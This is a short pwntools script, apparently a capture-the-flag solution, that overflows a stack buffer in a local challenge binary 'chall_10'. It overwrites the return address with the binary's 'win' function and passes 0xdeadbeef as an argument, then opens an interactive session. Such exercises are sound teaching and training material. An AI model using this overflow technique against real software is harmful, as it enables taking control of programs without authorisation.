from pwn import *
binary=ELF("./chall_10")
p=process("./chall_10")
p.sendline()
p.sendline((0x3a+0x4)*b"A"+p32(binary.sym.win)+p32(0)+p32(0xdeadbeef))
p.interactive()
